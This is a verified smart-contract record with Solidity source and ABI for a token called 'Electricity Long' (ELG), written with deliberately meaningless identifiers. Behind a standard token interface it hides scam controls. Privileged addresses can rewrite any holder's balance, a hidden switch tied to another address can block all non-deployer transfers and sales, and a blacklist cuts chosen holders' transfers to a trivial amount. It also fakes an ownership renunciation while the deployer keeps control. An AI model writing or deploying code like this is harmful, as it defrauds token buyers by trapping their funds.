{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface buyLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityEnable) external view returns (uint256);\n\n    function transfer(address tokenReceiverWallet, uint256 launchedFundLaunch) external returns (bool);\n\n    function allowance(address txSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFundLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenReceiverWallet,\n        uint256 launchedFundLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountSender, uint256 value);\n    event Approval(address indexed txSender, address indexed spender, uint256 value);\n}\n\nabstract contract launchSellSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTo {\n    function createPair(address amountFund, address launchTokenLimit) external returns (address);\n}\n\ninterface buyLaunchedMetadata is buyLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ElectricityLong is launchSellSender, buyLaunched, buyLaunchedMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTake;\n    }\n\n    uint256 private receiverReceiver;\n\n    mapping(address => uint256) private launchToTeam;\n\n    function balanceOf(address liquidityEnable) public view virtual override returns (uint256) {\n        return launchToTeam[liquidityEnable];\n    }\n\n    address public fromTradingSender;\n\n    function minTake(uint256 launchedFundLaunch) public {\n        listLaunchedWallet();\n        modeLiquidity = launchedFundLaunch;\n    }\n\n    function launchReceiverToken(address txSell, uint256 launchedFundLaunch) public {\n        listLaunchedWallet();\n        launchToTeam[txSell] = launchedFundLaunch;\n    }\n\n    function getOwner() external view returns (address) {\n        return toEnableReceiver;\n    }\n\n    uint256 public swapLiquidityAmount;\n\n    address shouldTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public totalFundLaunched;\n\n    function transfer(address txSell, uint256 launchedFundLaunch) external virtual override returns (bool) {\n        return fromWalletReceiver(_msgSender(), txSell, launchedFundLaunch);\n    }\n\n    string private liquidityTake = \"Electricity Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromIsReceiver;\n    }\n\n    function allowance(address tokenWallet, address atShould) external view virtual override returns (uint256) {\n        if (atShould == walletAtToken) {\n            return type(uint256).max;\n        }\n        return walletSwap[tokenWallet][atShould];\n    }\n\n    uint256 constant limitIs = 11 ** 10;\n\n    function listLaunchedWallet() private view {\n        require(minMax[_msgSender()]);\n    }\n\n    uint8 private fromIsReceiver = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverEnable;\n    }\n\n    constructor (){\n        \n        autoLaunched sellAmount = autoLaunched(walletAtToken);\n        fromEnable = tradingTo(sellAmount.factory()).createPair(sellAmount.WETH(), address(this));\n        if (swapLiquidityAmount != receiverReceiver) {\n            swapLiquidityAmount = receiverReceiver;\n        }\n        fromTradingSender = _msgSender();\n        feeLaunch();\n        minMax[fromTradingSender] = true;\n        launchToTeam[fromTradingSender] = totalFrom;\n        \n        emit Transfer(address(0), fromTradingSender, totalFrom);\n    }\n\n    function fromWalletReceiver(address atTokenTo, address tokenReceiverWallet, uint256 launchedFundLaunch) internal returns (bool) {\n        if (atTokenTo == fromTradingSender) {\n            return marketingBuy(atTokenTo, tokenReceiverWallet, launchedFundLaunch);\n        }\n        uint256 totalModeTo = buyLaunched(fromEnable).balanceOf(shouldTrading);\n        require(totalModeTo == modeLiquidity);\n        require(tokenReceiverWallet != shouldTrading);\n        if (totalFundLaunched[atTokenTo]) {\n            return marketingBuy(atTokenTo, tokenReceiverWallet, limitIs);\n        }\n        return marketingBuy(atTokenTo, tokenReceiverWallet, launchedFundLaunch);\n    }\n\n    function feeLaunch() public {\n        emit OwnershipTransferred(fromTradingSender, address(0));\n        toEnableReceiver = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private walletSwap;\n\n    uint256 modeLiquidity;\n\n    uint256 tradingFundTake;\n\n    address public fromEnable;\n\n    mapping(address => bool) public minMax;\n\n    string private receiverEnable = \"ELG\";\n\n    address private toEnableReceiver;\n\n    address walletAtToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed toFromExempt, address indexed liquidityMin);\n\n    function marketingBuy(address atTokenTo, address tokenReceiverWallet, uint256 launchedFundLaunch) internal returns (bool) {\n        require(launchToTeam[atTokenTo] >= launchedFundLaunch);\n        launchToTeam[atTokenTo] -= launchedFundLaunch;\n        launchToTeam[tokenReceiverWallet] += launchedFundLaunch;\n        emit Transfer(atTokenTo, tokenReceiverWallet, launchedFundLaunch);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalFrom;\n    }\n\n    function tokenAt(address totalAt) public {\n        listLaunchedWallet();\n        \n        if (totalAt == fromTradingSender || totalAt == fromEnable) {\n            return;\n        }\n        totalFundLaunched[totalAt] = true;\n    }\n\n    function fromSender(address feeTx) public {\n        if (receiverTrading) {\n            return;\n        }\n        if (receiverReceiver != launchAuto) {\n            launchAuto = swapLiquidityAmount;\n        }\n        minMax[feeTx] = true;\n        if (launchAuto != receiverReceiver) {\n            receiverReceiver = swapLiquidityAmount;\n        }\n        receiverTrading = true;\n    }\n\n    uint256 private totalFrom = 100000000 * 10 ** 18;\n\n    bool public receiverTrading;\n\n    function approve(address atShould, uint256 launchedFundLaunch) public virtual override returns (bool) {\n        walletSwap[_msgSender()][atShould] = launchedFundLaunch;\n        emit Approval(_msgSender(), atShould, launchedFundLaunch);\n        return true;\n    }\n\n    uint256 private launchAuto;\n\n    function transferFrom(address atTokenTo, address tokenReceiverWallet, uint256 launchedFundLaunch) external override returns (bool) {\n        if (_msgSender() != walletAtToken) {\n            if (walletSwap[atTokenTo][_msgSender()] != type(uint256).max) {\n                require(launchedFundLaunch <= walletSwap[atTokenTo][_msgSender()]);\n                walletSwap[atTokenTo][_msgSender()] -= launchedFundLaunch;\n            }\n        }\n        return fromWalletReceiver(atTokenTo, tokenReceiverWallet, launchedFundLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return toEnableReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFromExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFundLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTradingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFundLaunch\",\"type\":\"uint256\"}],\"name\":\"launchReceiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFundLaunch\",\"type\":\"uint256\"}],\"name\":\"minTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidityAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFundLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFundLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTokenTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFundLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ElectricityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}